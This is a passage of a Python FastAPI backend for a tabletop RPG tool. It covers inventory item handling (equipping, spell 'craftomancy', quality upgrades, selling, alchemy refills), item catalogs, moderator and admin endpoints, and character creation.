        if move_target == SELF_CONTAINER_ID and not (equipped is True or it.get("equipped")):
            raise HTTPException(400, "Only equipped items can be placed in Self")

    if equipped is not None:
        if it.get("consumable"):
            raise HTTPException(400, "Consumable items cannot be equipped")
        is_eq = bool(equipped)
        it["equipped"] = is_eq
        if is_eq:
            if it.get("container_id") != SELF_CONTAINER_ID:
                it["stowed_container_id"] = it.get("stowed_container_id") or it.get("container_id") or move_target or _default_stow_container(containers)
            it["container_id"] = SELF_CONTAINER_ID
        else:
            dest = move_target or it.get("stowed_container_id") or _default_stow_container(containers)
            if dest == SELF_CONTAINER_ID:
                dest = _default_stow_container(containers)
            it["container_id"] = dest or _default_stow_container(containers)
            if it["container_id"] != SELF_CONTAINER_ID:
                it["stowed_container_id"] = it["container_id"]
    elif move_target is not None:
        # only move / update stow without toggling equip
        if it.get("equipped"):
            it["stowed_container_id"] = move_target or _default_stow_container(containers)
        else:
            it["container_id"] = move_target or _default_stow_container(containers)
            it["stowed_container_id"] = it["container_id"]

    items[idx] = it
    containers, inv_total = _recompute_encumbrance(items, containers)
    db.inventories.update_one(
        {"id": inv_id, "owner": user},
        {"$set": {"items": items, "containers": containers, "enc_total": inv_total}}
    )

    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}

def _spell_school_info(spell: dict) -> tuple[list[dict], bool]:
    eff_ids = [str(eid) for eid in (spell.get("effects") or [])]
    if not eff_ids:
        return [], False
    eff_col = get_col("effects")
    sch_col = get_col("schools")
    eff_docs = list(eff_col.find({"id": {"$in": eff_ids}}, {"_id": 0, "id": 1, "school": 1}))
    school_ids = {str(d.get("school") or "") for d in eff_docs if d.get("school")}
    if not school_ids:
        return [], False
    sch_docs = list(sch_col.find({"id": {"$in": list(school_ids)}}, {"_id": 0, "id": 1, "name": 1, "school_type": 1, "type": 1, "upgrade": 1}))
    schools = []
    is_complex = False
    for s in sch_docs:
        if s.get("upgrade"):
            continue
        stype = (s.get("school_type") or s.get("type") or "").strip()
        schools.append({"id": s.get("id"), "name": s.get("name") or s.get("id"), "school_type": stype})
        if stype.lower() == "complex":
            is_complex = True
    return schools, is_complex

@app.post("/inventories/{inv_id}/items/{item_id}/craftomancy")
def add_craftomancy(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    spell_id = str(payload.get("spell_id") or "").strip()
    if not spell_id:
        raise HTTPException(400, "spell_id required")
    supreme = bool(payload.get("supreme", False))
    currency = (payload.get("currency") or "").strip() or None

    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    it = dict(items[idx])

    quality = (it.get("quality") or "").strip()
    if not quality:
        raise HTTPException(400, "Item quality required for craftomancy")

    sp = get_col("spells").find_one({"id": spell_id}, {"_id": 0})
    if not sp:
        raise HTTPException(404, "Spell not found")
    if str(sp.get("status") or "").lower() != "green":
        raise HTTPException(400, "Spell is not approved")

    row = craftomancy_row_for_quality(quality)
    allowed_cat = row.get("category") or "Novice"
    spell_cat = sp.get("category") or "Novice"
    spell_idx = craftomancy_category_index(spell_cat)
    allowed_idx = craftomancy_category_index(allowed_cat)
    if spell_idx < 0 or allowed_idx < 0:
        raise HTTPException(400, "Invalid spell category")
    if spell_idx > allowed_idx:
        raise HTTPException(400, f"Spell category exceeds quality limit ({allowed_cat})")

    effective_cat = craftomancy_next_category(spell_cat) if supreme else None
    if not effective_cat:
        effective_cat = spell_cat

    schools, is_complex = _spell_school_info(sp)
    price = int(row.get("price") or 0)
    hours = int(row.get("hours") or 0)
    if is_complex:
        price *= 2
        hours *= 2
    focus_cost = 3 if is_complex else 1

    crafts = it.get("craftomancies") or []
    if len(crafts) >= 2:
        raise HTTPException(400, "Craftomancy limit reached for this item")

    import uuid
    craft_entry = {
        "id": f"cm_{uuid.uuid4().hex[:8]}",
        "spell_id": sp.get("id"),
        "spell_name": sp.get("name") or sp.get("id"),
        "spell_category": spell_cat,
        "effective_category": effective_cat,
        "spell_description": sp.get("description") or sp.get("desc") or "",
        "spell_description_long": sp.get("description_long") or "",
        "spell_flavor": sp.get("flavor") or sp.get("flavour") or "",
        "spell_mp_cost": sp.get("mp_cost"),
        "spell_en_cost": sp.get("en_cost"),
        "spell_range": sp.get("range"),
        "spell_aoe": sp.get("aoe"),
        "spell_duration": sp.get("duration"),
        "spell_effects": sp.get("effects") or [],
        "spell_effects_detail": sp.get("effects_detail") or [],
        "spell_effects_meta": sp.get("effects_meta") or [],
        "schools": schools,
        "supreme": supreme,
        "focused": False,
        "order": len(crafts),
        "is_complex": is_complex,
        "focus_cost": focus_cost,
        "craft_quality": quality,
        "craft_skill": row.get("skill"),
        "craft_die": row.get("die"),
        "craft_dc": row.get("dc"),
        "craft_price": price,
        "craft_hours": hours,
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }
    crafts.append(craft_entry)
    it["craftomancies"] = crafts

    cur = inv.get("currencies") or {}
    cur_key = _pick_currency(inv, currency)
    cur[cur_key] = int(cur.get(cur_key, 0)) - price
    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": cur_key,
        "amount": -price,
        "note": f"Craftomancy {craft_entry['spell_name']} ({spell_cat}) on {it.get('name')}",
        "source": "craftomancy"
    }

    items[idx] = it
    db.inventories.update_one({"id": inv_id, "owner": user}, {"$set": {"items": items, "currencies": cur}, "$push": {"transactions": tx}})
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    warning = "Second craftomancy requires advanced Craftomancer." if len(crafts) > 1 else ""
    return {"status": "success", "inventory": inv2, "craftomancy": craft_entry, "warning": warning}

@app.patch("/inventories/{inv_id}/items/{item_id}/craftomancy/{craft_id}")
def update_craftomancy(request: Request, inv_id: str, item_id: str, craft_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    focused = payload.get("focused", None)
    order = payload.get("order", None)
    if focused is None and order is None:
        raise HTTPException(400, "focused or order required")

    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    it = dict(items[idx])
    crafts = it.get("craftomancies") or []
    hit = next((c for c in crafts if c.get("id") == craft_id), None)
    if not hit:
        raise HTTPException(404, "Craftomancy not found")
    if focused is not None:
        hit["focused"] = bool(focused)
    if order is not None:
        try:
            hit["order"] = int(order)
        except (TypeError, ValueError):
            raise HTTPException(400, "order must be an integer")
    it["craftomancies"] = crafts
    items[idx] = it
    db.inventories.update_one({"id": inv_id, "owner": user}, {"$set": {"items": items}})
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}

@app.post("/inventories/{inv_id}/items/{item_id}/craftomancy/{craft_id}/remove")
def remove_craftomancy(request: Request, inv_id: str, item_id: str, craft_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    currency = (payload.get("currency") or "").strip() or None
    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    it = dict(items[idx])
    crafts = it.get("craftomancies") or []
    hit_idx = next((i for i, c in enumerate(crafts) if c.get("id") == craft_id), -1)
    if hit_idx < 0:
        raise HTTPException(404, "Craftomancy not found")
    removed = crafts.pop(hit_idx)
    it["craftomancies"] = crafts

    price = 500
    cur = inv.get("currencies") or {}
    cur_key = _pick_currency(inv, currency)
    cur[cur_key] = int(cur.get(cur_key, 0)) - price
    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": cur_key,
        "amount": -price,
        "note": f"Remove craftomancy {removed.get('spell_name') or removed.get('spell_id')}",
        "source": "craftomancy_remove"
    }

    items[idx] = it
    db.inventories.update_one({"id": inv_id, "owner": user}, {"$set": {"items": items, "currencies": cur}, "$push": {"transactions": tx}})
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "removed": craft_id, "cost": price}

@app.post("/inventories/{inv_id}/items/{item_id}/upgrade_quality")
def upgrade_quality(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    # find item
    items = inv.get("items") or []
    it = next((x for x in items if x.get("item_id") == item_id), None)
    if not it:
        raise HTTPException(404, "Item not found")
    if it.get("kind") not in ("weapon", "equipment"):
        raise HTTPException(400, "Only weapons/equipment can upgrade quality")

    to = (payload.get("to") or "").strip()
    if to not in QUALITY_ORDER:
        raise HTTPException(400, "Invalid quality target")

    cur_q = it.get("quality") or "Adequate"
    if QUALITY_ORDER.index(to) <= QUALITY_ORDER.index(cur_q):
        raise HTTPException(400, "Target quality must be higher than current")

    base_price = int(it.get("base_price") or 0)
    qty = int(it.get("quantity") or 1)
    old_unit = int(_qprice(base_price, cur_q))
    new_unit = int(_qprice(base_price, to))
    per_unit_delta = new_unit - old_unit
    delta_total = per_unit_delta * qty
    if delta_total <= 0:
        raise HTTPException(400, "No cost difference to apply")

    currency = _pick_currency(inv, (payload.get("currency") or None))

    # deduct funds
    curmap = inv.get("currencies", {})
    curmap[currency] = int(curmap.get(currency, 0)) - delta_total

    # update item fields
    new_paid_unit = int(it.get("paid_unit") or old_unit) + per_unit_delta
    new_variant = _compose_variant(to, it.get("upgrades"))

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": -delta_total,
        "note": f'Upgrade quality: {it.get("name","Item")} {cur_q} → {to}',
        "source": "upgrade_quality",
        "item_id": item_id
    }

    db.inventories.update_one(
        {"id": inv_id, "owner": user, "items.item_id": item_id},
        {
            "$set": {
                "currencies": curmap,
                "items.$.quality": to,
                "items.$.paid_unit": new_paid_unit,
                "items.$.variant": new_variant
            },
            "$push": {"transactions": tx}
        }
    )
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.post("/inventories/{inv_id}/items/{item_id}/downgrade_quality")
def downgrade_quality(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    items = inv.get("items") or []
    it = next((x for x in items if x.get("item_id") == item_id), None)
    if not it:
        raise HTTPException(404, "Item not found")
    if it.get("kind") not in ("weapon", "equipment"):
        raise HTTPException(400, "Only weapons/equipment can downgrade quality")

    to = (payload.get("to") or "").strip()
    if to not in QUALITY_ORDER:
        raise HTTPException(400, "Invalid quality target")

    cur_q = it.get("quality") or "Adequate"
    if QUALITY_ORDER.index(to) >= QUALITY_ORDER.index(cur_q):
        raise HTTPException(400, "Target quality must be lower than current")

    base_price = int(it.get("base_price") or 0)
    old_unit = int(_qprice(base_price, cur_q))
    new_unit = int(_qprice(base_price, to))

    new_paid_unit = min(int(it.get("paid_unit") or old_unit), new_unit)
    new_variant = _compose_variant(to, it.get("upgrades"))

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": _pick_currency(inv, (payload.get("currency") or None)),
        "amount": 0,
        "note": f'Downgrade quality: {it.get("name","Item")} {cur_q} → {to}',
        "source": "downgrade_quality",
        "item_id": item_id
    }

    db.inventories.update_one(
        {"id": inv_id, "owner": user, "items.item_id": item_id},
        {
            "$set": {
                "items.$.quality": to,
                "items.$.paid_unit": new_paid_unit,
                "items.$.variant": new_variant
            },
            "$push": {"transactions": tx}
        }
    )
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.post("/inventories/{inv_id}/items/{item_id}/install_upgrade")
def install_upgrade(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    items = inv.get("items") or []
    it = next((x for x in items if x.get("item_id") == item_id), None)
    if not it:
        raise HTTPException(404, "Item not found")
    if it.get("kind") not in ("weapon", "equipment"):
        raise HTTPException(400, "Only weapons/equipment can install upgrades")

    upg_id = (payload.get("upgrade_id") or payload.get("upgrade") or "").strip()
    if not upg_id:
        raise HTTPException(400, "Missing upgrade id")

    upg_doc = get_col("upgrades").find_one({"id": upg_id})
    if not upg_doc:
        raise HTTPException(404, "Upgrade not found")

    kind = it.get("kind")
    if upg_doc.get("kind") != kind:
        raise HTTPException(400, "Upgrade kind mismatch")
    slot = None
    if kind == "equipment":
        slot = (it.get("equipment_slot") or it.get("slot") or "").lower()
        if upg_doc.get("slot") and slot and upg_doc.get("slot") != slot:
            raise HTTPException(400, "Upgrade not allowed for this equipment slot")

    existing = it.get("upgrades") or []
    add_payload = [{"id": upg_id, "target": (payload.get("target") or "").strip()}]
    add_upgrades, fee_per_unit, steps = _prepare_new_upgrades(existing, add_payload, kind, slot, it.get("quality") or "Adequate")
    if not add_upgrades:
        raise HTTPException(400, "Upgrade could not be applied")

    qty = int(it.get("quantity") or 1)
    delta_total = int(fee_per_unit) * qty
    currency = _pick_currency(inv, (payload.get("currency") or None))

    curmap = inv.get("currencies", {})
    curmap[currency] = int(curmap.get(currency, 0)) - delta_total

    new_upgrades = existing + add_upgrades
    if kind == "equipment" and not it.get("equipment_slot") and upg_doc.get("slot"):
        it["equipment_slot"] = upg_doc.get("slot")
    quality = it.get("quality") or "Adequate"
    new_paid_unit = int(it.get("paid_unit") or _qprice(int(it.get("base_price") or 0), quality)) + int(fee_per_unit)
    new_variant = _compose_variant(quality, new_upgrades)

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": -delta_total,
        "note": f'Install upgrade "{upg_doc.get("name","Upgrade")}" on {it.get("name","Item")}',
        "source": "install_upgrade",
        "item_id": item_id
    }

    db.inventories.update_one(
        {"id": inv_id, "owner": user, "items.item_id": item_id},
        {
            "$set": {
                "currencies": curmap,
                "items.$.upgrades": new_upgrades,
                "items.$.paid_unit": new_paid_unit,
                "items.$.variant": new_variant,
                **({"items.$.equipment_slot": it.get("equipment_slot")} if kind=="equipment" and it.get("equipment_slot") else {})
            },
            "$push": {"transactions": tx}
        }
    )
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.post("/inventories/{inv_id}/items/{item_id}/remove_upgrade")
def remove_upgrade(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    items = inv.get("items") or []
    it = next((x for x in items if x.get("item_id") == item_id), None)
    if not it:
        raise HTTPException(404, "Item not found")
    if it.get("kind") not in ("weapon", "equipment"):
        raise HTTPException(400, "Only weapons/equipment can remove upgrades")

    upg_id = (payload.get("upgrade_id") or payload.get("upgrade") or "").strip()
    target = (payload.get("target") or "").strip()
    if not upg_id:
        raise HTTPException(400, "Missing upgrade id")

    existing = it.get("upgrades") or []
    idx = next((i for i, u in enumerate(existing) if u.get("id") == upg_id and (not target or (u.get("target") or "") == target)), -1)
    if idx < 0:
        raise HTTPException(404, "Upgrade not found on item")

    new_upgrades = existing[:idx] + existing[idx+1:]
    quality = it.get("quality") or "Adequate"
    new_variant = _compose_variant(quality, new_upgrades)

    db.inventories.update_one(
        {"id": inv_id, "owner": user, "items.item_id": item_id},
        {"$set": {
            "items.$.upgrades": new_upgrades,
            "items.$.variant": new_variant
        }}
    )
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}


def _pop_inventory_item(inv: dict, item_id: str):
    containers = _ensure_self_container(inv.get("containers") or [])
    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    item = items[idx]
    remaining = items[:idx] + items[idx+1:]
    return item, remaining, containers


def _alchemy_tier_from_price(price: float) -> int:
    # map based on provided price ladder; fallback to nearest lower tier, minimum 1
    table = [
        (10000, 6),  # special
        (2000, 5),
        (1000, 4),
        (200, 3),
        (100, 2),
        (50, 1),
    ]
    for p, tier in table:
        if price >= p:
            return tier
    return 1


@app.post("/inventories/{inv_id}/items/{item_id}/dispose")
def dispose_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    it, remaining, containers = _pop_inventory_item(inv, item_id)
    currency = (payload.get("currency") or _pick_currency(inv)).strip()
    qty = int(it.get("quantity") or 1)

    curmap = inv.get("currencies", {})
    # no currency delta (disposed)

    containers, inv_enc_total = _recompute_encumbrance(remaining, containers)
    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": 0,
        "note": f"Disposed {it.get('name','Item')} x{qty}",
        "source": "dispose",
        "item_id": item_id
    }
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"currencies": curmap, "items": remaining, "containers": containers, "enc_total": inv_enc_total},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}


@app.post("/inventories/{inv_id}/items/{item_id}/sell")
def sell_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    it, remaining, containers = _pop_inventory_item(inv, item_id)
    currency = (payload.get("currency") or _pick_currency(inv)).strip()
    qty = int(it.get("quantity") or 1)
    base_price = int(it.get("base_price") or 0)
    quality = it.get("quality") or "Adequate"
    kind = it.get("kind") or "object"
    market_unit = _qprice(base_price, quality) if kind in ("weapon", "equipment") else base_price
    fallback_unit = int(it.get("paid_unit") or market_unit)
    try:
        price_input = float(payload.get("price")) if payload.get("price") is not None else fallback_unit
    except Exception:
        price_input = fallback_unit
    unit_price = max(0, int(round(price_input)))
    total = unit_price * qty

    curmap = inv.get("currencies", {})
    curmap[currency] = int(curmap.get(currency, 0)) + total

    containers, inv_enc_total = _recompute_encumbrance(remaining, containers)
    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": total,
        "note": f"Sold {it.get('name','Item')} x{qty} @ {unit_price}",
        "source": "sell",
        "item_id": item_id
    }
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"currencies": curmap, "items": remaining, "containers": containers, "enc_total": inv_enc_total},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}


@app.post("/inventories/{inv_id}/items/{item_id}/use")
def use_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    it = dict(items[idx])
    if not it.get("consumable"):
        raise HTTPException(400, "Item is not consumable")

    qty = max(0, int(it.get("quantity") or 1))
    if qty <= 0:
        raise HTTPException(400, "No quantity remaining")
    new_qty = max(0, qty - 1)
    keep_item = it.get("alchemy_tool") or new_qty > 0
    currency = (payload.get("currency") or _pick_currency(inv)).strip()

    if keep_item:
        it["quantity"] = new_qty
        it["equipped"] = False
        items[idx] = it
    else:
        items = items[:idx] + items[idx+1:]

    containers = _ensure_self_container(inv.get("containers") or [])
    containers, inv_enc_total = _recompute_encumbrance(items, containers)
    curmap = inv.get("currencies", {})

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": 0,
        "note": f"Used {it.get('name','Item')} (remaining {new_qty})",
        "source": "use",
        "item_id": item_id
    }
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"items": items, "containers": containers, "enc_total": inv_enc_total, "currencies": curmap},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}


@app.post("/inventories/{inv_id}/items/{item_id}/refill_alchemy")
def refill_alchemy_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")
    it = dict(items[idx])
    if not it.get("alchemy_tool"):
        raise HTTPException(400, "Item is not an alchemy tool")

    base_price = int(it.get("base_price") or 0)
    tier = _alchemy_tier_from_price(base_price)
    cost = 50 * max(1, tier)
    currency = (payload.get("currency") or _pick_currency(inv)).strip()

    curmap = inv.get("currencies", {})
    curmap[currency] = int(curmap.get(currency, 0)) - cost

    it["quantity"] = max(0, int(it.get("quantity") or 0)) + 1
    items[idx] = it

    containers = _ensure_self_container(inv.get("containers") or [])
    containers, inv_enc_total = _recompute_encumbrance(items, containers)

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": -cost,
        "note": f"Refill {it.get('name','Alchemy tool')} (+1) tier {tier}",
        "source": "refill_alchemy",
        "item_id": item_id
    }
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"items": items, "containers": containers, "enc_total": inv_enc_total, "currencies": curmap},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}


@app.get("/catalog/weapons")
def catalog_weapons(request: Request, q: str = "", tags: str = "", limit: int = 50):
    require_auth(request)
    col = get_col("weapons")
    filt = {"name": {"$regex": re.escape(q.strip()), "$options": "i"}} if q.strip() else {}
    if tags.strip():
        filt.update(_tags_filter(tags))
    rows = list(col.find(filt, {"_id": 0, "id": 1, "name": 1, "price": 1, "enc": 1, "subcategory": 1}).limit(int(limit)))
    return {"status": "success", "weapons": rows}

@app.get("/catalog/equipment")
def catalog_equipment(request: Request, q: str = "", tags: str = "", limit: int = 50):
    require_auth(request)
    col = get_col("equipment")
    filt = {"name": {"$regex": re.escape(q.strip()), "$options": "i"}} if q.strip() else {}
    if tags.strip():
        filt.update(_tags_filter(tags))
    rows = list(col.find(filt, {"_id": 0, "id": 1, "name": 1, "price": 1, "enc": 1, "category": 1, "slot":1}).limit(int(limit)))
    return {"status": "success", "equipment": rows}

@app.get("/catalog/tools")
def catalog_tools(request: Request, q: str = "", tags: str = "", limit: int = 50):
    require_auth(request)
    col = get_col("tools")
    _ensure_alchemy_tools_consumable()
    filt = {"name": {"$regex": re.escape(q.strip()), "$options": "i"}} if q.strip() else {}
    if tags.strip():
        filt.update(_tags_filter(tags))
    rows = list(col.find(filt, {"_id": 0, "id": 1, "name": 1, "price": 1, "enc": 1, "category": 1}).limit(int(limit)))
    return {"status": "success", "tools": rows}

@app.get("/moderator/spells")
def moderator_list_spells(request: Request, name: str = "", status: str = "", unassigned: str = ""):
    require_auth(request, roles=["moderator","admin"])
    q = {}
    if name:   q["name"] = {"$regex": name, "$options":"i"}
    if status: q["status"] = status.lower()
    if unassigned:
        q["$or"] = [{"creator": {"$exists": False}}, {"creator": None}, {"creator": ""}]
    rows = list(get_col("spells").find(q, {"_id":0, "id":1, "name":1, "creator":1}))
    rows.sort(key=lambda r: (r.get("creator") or "~", r.get("name","").lower()))
    return {"status":"success","spells": rows}

@app.put("/moderator/spells/{spell_id}/assign")
async def moderator_assign_spell(spell_id: str, request: Request):
    username, _ = require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    target_user = (body.get("username") or "").strip()
    if not target_user:
        return JSONResponse({"status":"error","message":"username required"}, status_code=400)

    col = get_col("spells")
    before = col.find_one({"id": spell_id})
    if not before:
        return JSONResponse({"status":"error","message":"Not found"}, status_code=404)

    col.update_one({"id": spell_id}, {"$set": {"creator": target_user}})
    after = col.find_one({"id": spell_id}, {"_id":0})
    try:
        write_audit("spell.assign", username, spell_id, {"creator": before.get("creator")}, {"creator": target_user})
    except Exception:
        pass
    return {"status":"success","id": spell_id, "creator": target_user}

LOGS_COL = "audit_logs"

@app.get("/admin/logs")
def admin_logs(request: Request, user: str = "", action: str = "", from_: str = "", to: str = "", limit: int = 200):
    admin_user, _ = require_auth(request, roles=["admin"])
    q = {}
    if user:   q["user"] = user
    if action: q["action"] = action
    if from_:
        try: q.setdefault("ts", {})["$gte"] = datetime.datetime.fromisoformat(from_.replace("Z",""))
        except Exception: pass
    if to:
        try: q.setdefault("ts", {})["$lte"] = datetime.datetime.fromisoformat(to.replace("Z",""))
        except Exception: pass

    items = list(get_col(LOGS_COL).find(q, {"_id":0}).sort("ts",-1).limit(min(1000, max(1, limit))))
    try: write_audit("logs.view", admin_user, None, {"filter": q}, {"count": len(items)})
    except Exception: pass
    return {"status": "success", "items": items}

@app.get("/users")
def list_users_for_assignment(request: Request):
    # moderators and admins may fetch the slim user list
    require_auth(request, roles=["moderator", "admin"])
    users = list(get_col("users").find({}, {"_id": 0, "username": 1, "role": 1}))
    users.sort(key=lambda u: u["username"].lower())
    return {"status": "success", "users": users}


# ---------- Characters (minimal v1) ----------
def _bool_from(val):
    if isinstance(val, bool):
        return val
    if isinstance(val, str):
        return val.strip().lower() in ("1", "true", "yes", "y", "on")
    if isinstance(val, (int, float)):
        return bool(val)
    return False

def _optional_auth(request: Request):
    token = get_auth_token(request)
    if token and token in SESSIONS:
        return SESSIONS[token]
    return None, None

def _public_character_ref(field: str, value: str) -> bool:
    if not value:
        return False
    hit = get_col("characters").find_one({field: value, "public": True}, {"_id": 1})
    return bool(hit)

def _can_view(doc, username, role):
    if doc.get("public"):
        return True
    if role == "admin":
        return True
    return doc.get("owner") == username

@app.get("/characters")
def list_my_characters(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    q = {"owner": username}
    chars = list(get_col("characters").find(q, {"_id": 0}))
    for ch in chars:
        lvl = int(ch.get("level") or ch.get("stats",{}).get("level") or 1)
        ch["archetype_rank"] = _archetype_rank_for_level(lvl)
    return {"status": "success", "characters": chars}

@app.get("/admin/characters")
def admin_list_characters(request: Request):
    require_auth(request, roles=["admin"])
    chars = list(get_col("characters").find({}, {"_id": 0}))
    return {"status": "success", "characters": chars}

@app.post("/characters")
async def create_character(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    try:
        body = await request.json()
    except Exception:
        body = {}
    owner = body.get("owner") if (role == "admin" and body.get("owner")) else username
    name = (body.get("name") or "New Character").strip()

    inv_id = ""
    try:
        inv_id = (body.get("inventory_id") or "").strip()
    except Exception:
        inv_id = ""
    if inv_id:
        inv = get_col("inventories").find_one({"id": inv_id, "owner": owner}, {"_id": 1})
        if not inv:
            return JSONResponse({"status": "error", "message": "Inventory not found or not owned by you"}, status_code=400)

    spell_list_id = ""
    try:
        spell_list_id = (body.get("spell_list_id") or "").strip()
    except Exception:
        spell_list_id = ""
    if spell_list_id:
        sl = get_col("spell_lists").find_one({"id": spell_list_id, "owner": owner}, {"_id": 1})
        if not sl:
            return JSONResponse({"status": "error", "message": "Spell list not found or not owned by you"}, status_code=400)

    cid = next_id_str("characters", padding=4)
    public_flag = _bool_from(body.get("public"))
    doc = {
        "id": cid,
        "owner": owner,
        "name": name,
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
        "updated_at": datetime.datetime.utcnow().isoformat() + "Z",
        "public": public_flag,
        "sublimations": body.get("sublimations") or [],
        "avatar_id": "",
        "archetype_id": (body.get("archetype_id") or "").strip(),
        "expertise_ids": body.get("expertise_ids") or [],
        "divine_manifestation_ids": body.get("divine_manifestation_ids") or [],
        "awakening_ids": body.get("awakening_ids") or [],
    }
    if inv_id:
        doc["inventory_id"] = inv_id
    if spell_list_id:
        doc["spell_list_id"] = spell_list_id
    get_col("characters").insert_one(dict(doc))
    return {"status": "success", "id": cid, "character": {k: v for k, v in doc.items() if k != "_id"}}

@app.get("/characters/{cid}")
def get_character(cid: str, request: Request):
    username, role = _optional_auth(request)
    doc = get_col("characters").find_one({"id": cid}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Character not found")
    if not _can_view(doc, username, role):
        if not username:
            raise HTTPException(401, "Not authenticated")
        raise HTTPException(403, "Forbidden")
    lvl = int(doc.get("level") or doc.get("stats",{}).get("level") or 1)
    arc_id = doc.get("archetype_id") or ""
    arc = get_col("archetypes").find_one({"id": arc_id}, {"_id":0}) if arc_id else None
    eff_rank = _archetype_rank_for_level(lvl)
    doc["archetype_rank"] = eff_rank
    if arc:
        doc["computed_archetype_abilities"] = _compute_archetype_unlocked(arc, lvl)
    return {"status":"success","character":doc}

@app.put("/characters/{cid}")
async def update_character(cid: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    before = get_col("characters").find_one({"id": cid})
